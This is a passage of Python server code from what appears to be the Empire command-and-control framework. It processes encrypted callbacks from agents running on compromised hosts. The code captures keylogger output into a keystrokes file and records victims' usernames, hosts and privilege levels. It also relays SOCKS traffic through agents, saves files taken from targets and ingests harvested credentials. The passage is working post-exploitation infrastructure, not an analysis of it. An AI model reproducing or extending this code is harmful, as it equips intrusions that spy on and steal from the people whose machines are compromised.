            message = f"handle_agent_response(): sessionID {session_id} not in cache"
            log.error(message)
            return None

        # extract the agent's session key
        sessionKey = cached_agent["sessionKey"]
        with contextlib.suppress(Exception):
            sessionKey = bytes.fromhex(sessionKey)

        try:
            # verify, decrypt and depad the packet
            packet = AESCipher.decrypt_and_verify(sessionKey, enc_data)

            # process the packet and extract necessary data
            responsePackets = packets.parse_result_packets(packet)
            # One session/transaction per agent callback regardless of N packets.
            taskings_to_hook = []
            with SessionLocal.begin() as db:
                if update_lastseen:
                    self.agent_service.update_agent_lastseen(db, session_id)

                for (
                    responseName,
                    _totalPacket,
                    _packetNum,
                    taskID,
                    _length,
                    data,
                ) in responsePackets:
                    tasking = self._process_agent_packet(
                        db, session_id, responseName, taskID, data
                    )
                    db.flush()
                    if tasking is not None:
                        db.expunge(tasking)
                        taskings_to_hook.append(tasking)

            results = bool(responsePackets)
            for tasking in taskings_to_hook:
                hooks.run_hooks(hooks.AFTER_TASKING_RESULT_HOOK, None, tasking)
            if results:
                # signal that this agent returned results
                message = f"Agent {session_id} returned results."
                log.info(message)

        except Exception as e:
            message = f"Error processing result packet from {session_id} : {e}"
            log.exception(message)
            return None
        else:
            # return a 200/valid
            return "VALID"

    def _process_agent_packet(  # noqa: PLR0912 PLR0915
        self, db: Session, session_id, response_name, task_id, data
    ):
        """
        Handle the result packet based on sessionID and responseName.
        """
        key_log_task_id = None

        # PK lookup; cheaper than .filter(...).first() (no WHERE planning)
        # and benefits from SQLAlchemy's identity map if the row is
        # already loaded in the session.
        agent = db.get(models.Agent, session_id)

        # report the agent result in the reporting database
        message = f"Agent {session_id} got results for task {task_id}"
        log.info(message)

        tasking = db.scalars(
            select(models.AgentTask).where(
                and_(
                    models.AgentTask.id == task_id,
                    models.AgentTask.agent_id == session_id,
                )
            )
        ).first()

        # insert task results into the database, if it's not a file
        if (
            task_id != 0
            and response_name
            not in [
                "TASK_DOWNLOAD",
                "TASK_POWERSHELL_CMD_WAIT_SAVE",
                "TASK_PYTHON_CMD_WAIT_SAVE",
            ]
            and data is not None
        ):
            # add keystrokes to database
            is_keylogger = "function Get-Keystrokes" in tasking.input or (
                tasking.module_name
                and "keylogger" in tasking.module_name.lower()
                and tasking.task_name == "TASK_CSHARP_CMD_JOB"
            )
            if is_keylogger:
                tasking.status = AgentTaskStatus.continuous
                key_log_task_id = tasking.id
                if tasking.output is None or tasking.output.startswith(
                    ("Task Started", "Job started")
                ):
                    tasking.output = ""

                if data:
                    raw_key_stroke = (
                        data.decode("UTF-8") if isinstance(data, bytes) else data
                    )
                    if tasking.task_name == "TASK_CSHARP_CMD_JOB":
                        # C# keylogger: strip pipe noise, convert markers
                        raw_key_stroke = raw_key_stroke.replace("\r\n", "").replace(
                            "[NL]", "\n"
                        )
                    else:
                        # PowerShell keylogger uses [Enter] markers
                        raw_key_stroke = (
                            raw_key_stroke.replace("\r\n", "")
                            .replace("[SpaceBar]", "")
                            .replace("\b", "")
                            .replace("[Shift]", "")
                            .replace("[Enter]\r", "\r\n")
                        )
                    tasking.output += raw_key_stroke
            else:
                tasking.original_output = data
                tasking.output = data
                tasking.status = AgentTaskStatus.completed

                # Not sure why, but for Python agents these are bytes initially, but
                # after storing in the database they're strings. So we need to convert
                # so socketio and other hooks get the right data type.
                if isinstance(tasking.output, bytes):
                    try:
                        tasking.output = tasking.output.decode("UTF-8")
                    except UnicodeDecodeError:
                        tasking.output = tasking.output.decode("latin-1")
                if isinstance(tasking.original_output, bytes):
                    try:
                        tasking.original_output = tasking.original_output.decode(
                            "UTF-8"
                        )
                    except UnicodeDecodeError:
                        tasking.original_output = tasking.original_output.decode(
                            "latin-1"
                        )

            hooks.run_hooks(hooks.BEFORE_TASKING_RESULT_HOOK, db, tasking)
            db, tasking = hooks.run_filters(
                hooks.BEFORE_TASKING_RESULT_FILTER, db, tasking
            )

            db.flush()

        # TODO: for heavy traffic packets, check these first (i.e. SOCKS?)
        #       so this logic is skipped

        if response_name == "ERROR":
            tasking.status = AgentTaskStatus.error

            # error code
            message = f"Received error response from {session_id}"
            log.error(message)

            if isinstance(data, bytes):
                data = data.decode("UTF-8")
            # update the agent log
            self.agent_service.save_agent_log(session_id, "Error response: " + data)
            # Cancel any pending chunked uploads if the errored task was an upload
            if tasking and tasking.task_name == "TASK_UPLOAD":
                self.agent_task_service.cancel_pending_uploads(session_id)

        elif response_name == "TASK_SYSINFO":
            # sys info response -> update the host info
            data = data.decode("utf-8")
            parts = data.split("|")
            if len(parts) < proto.SYSINFO_MIN_PARTS:
                message = f"Invalid sysinfo response from {session_id}"
                log.error(message)
            else:
                # extract appropriate system information
                listener = parts[1]
                domainname = parts[2]
                username = parts[3]
                hostname = parts[4]
                internal_ip = parts[5]
                os_details = parts[6]
                high_integrity = 1 if str(parts[7]).lower() == "true" else 0
                process_name = parts[8]
                process_id = parts[9]
                language = parts[10]
                language_version = parts[11]
                architecture = parts[12]
                dotnet_version = parts[13] if len(parts) > 13 else ""  # noqa: PLR2004

                if domainname:
                    username = f"{domainname}\\{username}"

                # update the agent with this new information
                self.update_agent_sysinfo(
                    db,
                    session_id,
                    internal_ip=internal_ip,
                    username=username,
                    hostname=hostname,
                    os_details=os_details,
                    high_integrity=high_integrity,
                    process_name=process_name,
                    process_id=process_id,
                    language_version=language_version,
                    language=language,
                    architecture=architecture,
                    dotnet_version=dotnet_version,
                )

                sysinfo = (
                    "\n".join(
                        [
                            f"{'Listener:':<18}{listener}",
                            f"{'Internal IP:':<18}{internal_ip}",
                            f"{'Username:':<18}{username}",
                            f"{'Hostname:':<18}{hostname}",
                            f"{'OS:':<18}{os_details}",
                            f"{'High Integrity:':<18}{high_integrity}",
                            f"{'Process Name:':<18}{process_name}",
                            f"{'Process ID:':<18}{process_id}",
                            f"{'Language:':<18}{language}",
                            f"{'Language Version:':<18}{language_version}",
                            f"{'Architecture:':<18}{architecture}",
                            f"{'DotNet Version:':<18}{normalize_dotnet_version(dotnet_version) or 'unknown'}",
                        ]
                    )
                    + "\n"
                )

                # update the agent log
                self.agent_service.save_agent_log(session_id, sysinfo)

        elif response_name == "TASK_EXIT":
            # exit command response
            # let everyone know this agent exited
            message = f"Agent {session_id} exiting"
            log.info(message)

            # update the agent results and log
            self.agent_service.save_agent_log(session_id, data)

            # set agent to archived in the database
            agent.archived = True

            # Close socks client
            self.agent_socks_service.close_socks_client(agent)

        elif response_name == "TASK_SHELL":
            # shell command response
            # update the agent log
            self.agent_service.save_agent_log(session_id, data)

        elif response_name == "TASK_CHDIR":
            self.agent_service.save_agent_log(session_id, data)

        elif response_name == "TASK_SOCKS":
            self.agent_socks_service.start_socks_client(agent)

            self.agent_service.save_agent_log(session_id, data)

        elif response_name == "TASK_SOCKS_DATA":
            self.agent_socks_service.queue_socks_data(agent, base64.b64decode(data))
            return None

        elif response_name == "TASK_DOWNLOAD":
            # file download
            if isinstance(data, bytes):
                data = data.decode("UTF-8")

            parts = data.split("|")
            if len(parts) != proto.DOWNLOAD_RESPONSE_PARTS:
                message = f"Received invalid file download response from {session_id}"
                log.error(message)
            else:
                index, path, filesize, data = parts
                # decode the file data and save it off as appropriate
                file_data = helpers.decode_base64(data.encode("UTF-8"))

                self.save_file(
                    db,
                    session_id,
                    path,
                    file_data,
                    filesize,
                    tasking,
                    agent.language,
                    append=index != "0",
                )

                # update the agent log
                msg = f"file download: {path}, part: {index}"
                self.agent_service.save_agent_log(session_id, msg)

        elif response_name == "TASK_DIR_LIST":
            try:
                result = json.loads(data.decode("utf-8"))
                self._update_dir_list(db, session_id, result)
            except (UnicodeDecodeError, json.JSONDecodeError, KeyError):
                log.exception(
                    "TASK_DIR_LIST: failed to process directory listing for %s",
                    session_id,
                )

            self.agent_service.save_agent_log(session_id, data)

        elif response_name == "TASK_GETDOWNLOADS":
            if not data or not data.strip():
                data = "[*] No active downloads"

            # update the agent log
            self.agent_service.save_agent_log(session_id, data)

        elif response_name == "TASK_STOPDOWNLOAD":
            # download kill response
            # update the agent log
            self.agent_service.save_agent_log(session_id, data)

        elif response_name == "TASK_UPLOAD":
            if isinstance(data, bytes):
                data = data.decode("UTF-8", errors="replace")
            self.agent_service.save_agent_log(session_id, data)
            if data and data.startswith("[*] Upload of"):
                self.agent_task_service.queue_next_upload_chunk(db, session_id)
            else:
                self.agent_task_service.cancel_pending_uploads(session_id)

        elif response_name == "TASK_GETJOBS":
            if not data or not data.strip():
                data = "[*] No active jobs"

            # running jobs
            # update the agent log
            self.agent_service.save_agent_log(session_id, data)

        elif response_name == "TASK_STOPJOB":
            # job kill response
            # update the agent log
            self.agent_service.save_agent_log(session_id, data)

        elif response_name in [
            "TASK_POWERSHELL_CMD_WAIT",
            "TASK_PYTHON_CMD_WAIT",
            "TASK_CSHARP_CMD_WAIT",
            "TASK_BOF_CMD_WAIT",
        ]:
            # dynamic script output -> blocking
            self._ingest_credentials(db, agent, tasking, data)
            self.agent_service.save_agent_log(session_id, data)

        elif response_name in [
            "TASK_POWERSHELL_CMD_WAIT_SAVE",
            "TASK_PYTHON_CMD_WAIT_SAVE",
        ]:
            # dynamic script output -> blocking, save data

            # extract the file save prefix and extension
            prefix = data[0:15].strip().decode("UTF-8")
            extension = data[15:20].strip().decode("UTF-8")
            file_data = helpers.decode_base64(data[20:])

            # save the file off to the appropriate path
            save_path = (
                f"{prefix}/{agent.hostname}_{helpers.get_file_datetime()}.{extension}"
            )
            final_save_path = self.save_module_file(
                session_id, save_path, file_data, agent.language
            )

            if final_save_path is None:
                return None

            # update the agent log
            msg = f"Output saved to .{final_save_path}"
            self.agent_service.save_agent_log(session_id, msg)

            # attach file to tasking
            download = models.Download(
                location=str(final_save_path),
                filename=final_save_path.name,
                size=final_save_path.stat().st_size,
            )
            db.add(download)
            db.flush()
            tasking.downloads.append(download)

        elif response_name in [
            "TASK_POWERSHELL_CMD_JOB",
            "TASK_PYTHON_CMD_JOB",
            "TASK_CSHARP_CMD_JOB",
        ]:
            # check if this is a keylogging task, if so, write output to file instead of screen
            if key_log_task_id and key_log_task_id == task_id:
                download_dir = empire_config.directories.downloads
                save_path = download_dir / session_id / "keystrokes.txt"

                if not self._is_path_safe(save_path, download_dir, session_id):
                    return None

                with save_path.open("a+") as f:
                    if isinstance(data, bytes):
                        data = data.decode("UTF-8")
                    if response_name == "TASK_CSHARP_CMD_JOB":
                        new_results = data.replace("\r\n", "").replace("[NL]", "\n")
                    else:
                        new_results = (
                            data.replace("\r\n", "")
                            .replace("[SpaceBar]", "")
                            .replace("\b", "")
                            .replace("[Shift]", "")
                            .replace("[Enter]\r", "\r\n")
                        )
                    f.write(new_results)

            else:
                # dynamic script output -> non-blocking
                self._ingest_credentials(db, agent, tasking, data)
                self.agent_service.save_agent_log(session_id, data)

        else:
            log.warning(f"Unknown response {response_name} from {session_id}")

        return tasking

    def autorun_tasks(self, db: Session, session_id):
        agent = db.scalars(
            select(models.Agent).where(models.Agent.session_id == session_id)
        ).first()

        listener = self.listener_service.get_by_name(db, agent.listener)

        if listener.autorun_tasks:
            for module_req in listener.autorun_tasks:
                try:
                    module_request = ModulePostRequest.parse_obj(module_req)
                    self.agent_task_service.create_task_module(
                        db, agent, module_request
                    )
                except ValidationError:
                    log.exception("Error parsing module request")

    def generate_sessionid(self):
        return "".join(
            secrets.choice(string.ascii_uppercase + string.digits) for _ in range(8)
        )
